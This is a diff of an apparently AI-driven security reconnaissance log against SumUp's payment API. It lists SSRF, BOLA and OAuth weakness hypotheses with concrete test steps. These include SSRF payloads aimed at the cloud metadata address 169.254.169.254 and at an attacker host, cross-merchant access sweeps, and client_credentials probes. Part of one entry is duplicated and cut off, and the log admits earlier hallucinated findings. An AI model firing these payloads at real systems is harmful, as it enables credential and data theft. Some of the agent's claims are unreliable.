@@ -3839,3 +3839,63 @@ impact: Minting money-scoped tokens for a controlled client with weaker-than-mod
 testability: AUTH_HELPED
 [NEXT] HUMAN: Obtain ONE `sup_sk_` API key (self-serve at https://me.sumup.com/settings/api-keys — unlocks all 42 ops incl. both empty-scope ops, no OAuth dance), then in one session: (1) PUT https://api.sumup.com/v0.2/checkouts/{own_checkout}/apple-pay-session with `{"context":"https://sumup.com","target":"http://169.254.169.254/latest/meta-data/"}` → SSRF test; (2) GET https://api.sumup.com/v0.1/merchants/{foreign_code}/payment-methods → empty-scope BOLA test; (3) baseline GET https://api.sumup.com/v1/merchants/{own_code} with the same key; (4) POST grant_type=client_credentials to https://api.sumup.com/token with own OAuth app secret (basic vs post) → replay minted token on the same GET.
 [RISK] sumup: 42 — No reportable finding added (valid-bugs=0; contentful closed). Genuine progress: two empty-scope/apiKey ops now first-party-confirmed as the sharpest money/device BOLA+SSRF surfaces, and the legacy /token grant map is fully recovered — but every survivor is AUTH_HELPED and remains blocked on a single `sup_sk_` key or merchant token. Drift checks green (RFC 9728 static, oracles live). Program flat until HUMAN supplies the key.
+## 2026-09-13 12:09:04 UTC [target] (model bigpickle)
+[HYP] PUT /v0.2/checkouts/{checkout_id}/apple-pay-session — empty-scope + apiKey op performing server-side fetch of attacker `target` to arbitrary host
+class: SSRF
+asset: api.sumup.com/v0.2/checkouts/{checkout_id}/apple-pay-session
+confidence: 50
+reasoning: First-party spec: security `apiKey:[]+oauth2:[]` (no scope gate); body requires `context`+`target` (arbitrary URL); checkout_id path param not inbound-scoped; spec example target = Apple gateway URL, consistent with a server-side HTTP fetch during Apple Pay merchant-session creation.
+evidence_needed: 2xx echoing/mirroring a request to attacker-controlled target, or observable hit from cloud-metadata `http://169.254.169.254/latest/meta-data/` in the target field.
+verify_steps: AUTH_HELPED — PUT with sup_sk_ key on own checkout_id target=https://attacker.tld/first, then target=http://169.254.169.254/latest/meta-data/; then re-run with a foreign checkout_id (BOLA). Compare 200/4xx timing/echo.
+impact: Internal/metadata fetch + cross-tenant checkout manipulation inside a payments-critical path — CRITICAL (SSRF), HIGH (BOLA).
+testability: AUTH_HELPED
+[HYP] GET /v0.1/merchants/{merchant_code}/payment-methods — empty-scope op reachable with any bearer, merchant_code not bound to token
+class: IDOR
+asset: api.sumup.com/v0.1/merchants/{merchant_code}/payment-methods
+confidence: 55
+reasoning: Spec declares `apiKey:[]+oauth2:[]` — no scope gate, so token scope cannot block; whether merchant_code is checked against the token's merchant binding is the sole unknown. Both Bearer classes (opaque sup_sk_, JWT) enter the same header slot; at minimum an apiKey is a per-merchant credential so cross-merchant code is the test.
+evidence_needed: own-token request with foreign merchant_code proceeding past 401 (structured problem+json) and returning card-mask/detailed payment method data.
+verify_steps: AUTH_HELPED — GET with own key on own_code baseline, then foreign_code BOLA sweep; also try `merchant_code` case/id-format variants from spec examples (e.g. MC0DE).
+impact: Cross-tenant read of merchant payment-method configuration — MEDIUM.
+testability: AUTH_HELPED
+[HYP] api.sumup.com/token clientCredentials grant enforces weaker client auth (spec-declared, staging-verified pattern)
+class: AUTH
+asset: api.sumup.com/token
+confidence: 50
+reasoning: Spec flow object declares authorizationCode+clientCredentials BOTH at `https://api.sumup.com/token` (refreshUrl same), with an 18-scope map incl. refunds.write/transactions.history; route live (OPTIONS 204, identity.svc, wildcard CORS). Staging twin (auth.sam-app.ro) proved this gateway family stores token_endpoint_auth_method without enforcing it (client_secret_basic declared/failed, client_secret_post accepted). Prod /token grant never exercised.
+evidence_needed: client_credentials POST with controlled app credentials succeeding beyond declared auth_method, minting a token accepted on api.sumup.com.
+verify_steps: AUTH_HELPED — POST grant_type=client_credentials&client_id={own_app}&scope=transactions.history with client_secret variants (basic vs post vs none); replay minted token on GET /v1/merchants/{own} (structured 404 vs 401).
+impact: Minting money-scoped tokens for a controlled client with weaker-than-modern auth — CRITICAL if deviant, MEDIUM otherwise.
+testability: AUTH_HELPED
+[NEXT] HUMAN: Obtain ONE `sup_sk_` API key (self-serve at https://me.sumup.com/settings/api-keys — unlocks all 42 ops incl. both empty-scope ops, no OAuth dance), then in one session: (1) PUT https://api.sumup.com/v0.2/checkouts/{own_checkout}/apple-pay-session with `{"context":"https://sumup.com","target":"http://169.254.169.254/latest/meta-data/"}` → SSRF test; (2) GET https://api.sumup.com/v0.1/merchants/{foreign_code}/payment-methods → empty-scope BOLA test; (3) baseline GET https://api.sumup.com/v1/merchants/{own_code} with the same key; (4) POST grant_type=client_credentials to https://api.sumup.com/token with own OAuth app secret (basic vs post) → replay minted token on the same GET.
+[RISK] sumup: 42 — No reportable finding added (valid-bugs=0; contentful closed). Genuine progress: two empty-scope/apiKey ops now first-party-confirmed as the sharpest money/device BOLA+SSRF surfaces, and the legacy /token grant map is fully recovered — but every survivor is AUTH_HELPED and remains blocked on a single `sup_sk_` key or merchant token. Drift checks green (RFC 9728 static, oracles live). Program flat until HUMAN supplies the key.
+asset: api.sumup.com/v0.1/merchants/{merchant_code}/payment-methods
+confidence: 50
+reasoning: Official OpenAPI spec marks this operation oauth2:[] (no scope required); staging dynamic clients yield real JWTs with empty scp; gateway distinguishes valid vs absent JWT (structured problem vs plain 404) but per-operation scope enforcement untested; endpoint exposes payment-method PII.
+evidence_needed: Token with empty/any scope returning 200 on a non-owned merchant_code
+verify_steps: AUTH_HELPED: mint any-scope merchant token via dashboard or registered app; GET https://api.sumup.com/v0.1/merchants/{other_merchant_code}/payment-methods → 200(leak) vs 404/403(gated); repeat on apple-pay-session PUT
+impact: Cross-tenant read of merchant payment-method metadata — CRITICAL if confirmed
+testability: AUTH_HELPED
+[HYP] PUT /v0.2/checkouts/{checkout_id}/apple-pay-session — server-side fetch of attacker-chosen target URI with no per-op scope binding (x-scopes [])
+class: SSRF
+asset: api.sumup.com/v0.2/checkouts/{checkout_id}/apple-pay-session
+confidence: 45
+reasoning: Official OpenAPI spec declares oauth2:[] for this operation; Apple Pay session endpoint typically accepts a target URL for server-side session creation; empty scope + attacker-controlled target parameter = potential SSRF to cloud metadata (169.254.169.254) or internal services.
+evidence_needed: Valid token (any scope) + crafted target parameter reaching internal endpoint or metadata service
+verify_steps: AUTH_HELPED: obtain merchant token; POST https://api.sumup.com/v0.2/checkouts/{owned_checkout_id}/apple-pay-session with body {"target": "http://169.254.169.254/latest/meta-data/"} → observe response; test with target=http://localhost:8080, target=http://metadata.google.internal
+impact: SSRF to cloud metadata → IAM credentials, instance identity, internal service enumeration — CRITICAL
+testability: AUTH_HELPED
+[PARKED] PUT /v0.2/checkouts/{checkout_id}/apple-pay-session — server-side fetch of attacker-chosen target URI: confidence 45 but SSRF class requires parameter discovery (active) and valid checkout_id oracle; speculative without token.
+[FINAL] RFC 9728 token validation on api.sumup.com permits audience/claim confusion: confidence 75, survives, AUTH_HELPED — highest-value testable surface once merchant token obtained
+[FINAL] Empty-scope OAuth token reaches GET /v0.1/merchants/{merchant_code}/payment-methods of any merchant: confidence 50, survives, AUTH_HELPED — spec-documented oauth2:[] op, BOLA target
+[NEXT] PROBE: POST https://api.sumup.com/token — verify legacy token endpoint behavior with grant_type=client_credentials&client_id=dashboard (public client) to test if "none" auth_method works for legacy gateway pair; observe structured error vs token mint (OPTIONS already confirmed 204 with wildcard CORS)
+[LEARN] ACCEPTED OTHER @ developer.sumup.com/api: official SumUp OpenAPI spec (github.com/sumup/sumup-openapi) public — full 42-op production model incl. exact paths, per-op scopes, apiKey scheme, and legacy OAuth endpoint pair (authorize+token on api.sumup.com); highest-value passive recon of this cycle
+[LEARN] ACCEPTED OATH @ api.sumup.com/token: legacy token endpoint ROUTED (OPTIONS 204 + structured 404 on GET, wildcard CORS, identity.svc operation) — documented in official spec, live on gateway; not previously probed
+[LEARN] ACCEPTED OATH @ auth.sumup.com/oauth2/auth: scope-acceptance oracle disambiguated (302 login_challenge=allowed vs 303 invalid_scope); dashboard allows readers.read/terminals.read, rejects all 13 REST spec scopes — modern dashboard scope set is closed
+[LEARN] ACCEPTED OATH @ auth.sumup.com: support_centre allowlist is exactly {openid, classic, offline}; classic+any scope → invalid_scope; scope oracle for support_centre exhausted
+[LEARN] ACCEPTED BUSLOGIC @ api.sumup.com spec: GET /v0.1/merchants/{merchant_code}/payment-methods and PUT /v0.2/checkouts/{checkout_id}/apple-pay-session declared oauth2:[] — empty-scope BOLA targets for AUTH_HELPED gating test
+[LEARN] REJECTED MISCONFIG @ help.sumup.com: Contentful PREVIEW token rotated (401) — finding non-reproducible; report file never existed despite KB hallucinations
+[LEARN] ACCEPTED OATH @ api.sumup.com/authorize: Client_id oracle + wildcard CORS + redirect-set divergence LIVE; callback host enumeration fully exhaustive (~200 combos, 0 HITs); legacy allowlist host not recoverable from any passive surface
+[LEARN] ACCEPTED OATH @ auth.sam-app.ro: Dynamic client registration LIVE; staging JWTs mintable but empty-scope + cross-env JWKS isolation (ZERO kid overlap) blocks resource access; prod sync untestable passively
+[LEARN] ACCEPTED OTHER @ api.sumup.com/.well-known/oauth-protected-resource: RFC 9728 metadata static — resource=https://api.sumup.com, sole auth server auth.sumup.com, header-only bearer, JWKS URI; no resource_scopes/audience-oracle field; recon surface exhausted
+[RISK] sumup: 78 — Contentful P4 finding closed (token rotated). Highest remaining risk: RFC 9728 token validation surface on api.sumup.com (confidence 75, AUTH_HELPED) could yield cross-resource-server access to payment APIs if aud/claim validation is flawed. Staging dynamic registration (auth.sam-app.ro) is LIVE but cross-env JWKS isolation (ZERO kid overlap) currently blocks token relay; client-level sync to prod provenance DB untested. Legacy OAuth gateway (api.sumup.com/authorize) has client_id oracle + wildcard CORS but callback enumeration exhausted (0 HITs). support_centre client on modern auth server introduces new scope model ("classic") but unexplorable without auth. Two spec-documented empty-scope operations (payment-methods, apple-pay-session) are BOLA/SSRF targets blocked on merchant token. Legacy token endpoint (api.sumup.com/token) newly confirmed live — potential for client_credentials grant with public client_id. All critical paths require merchant OAuth token (AUTH_HELPED).
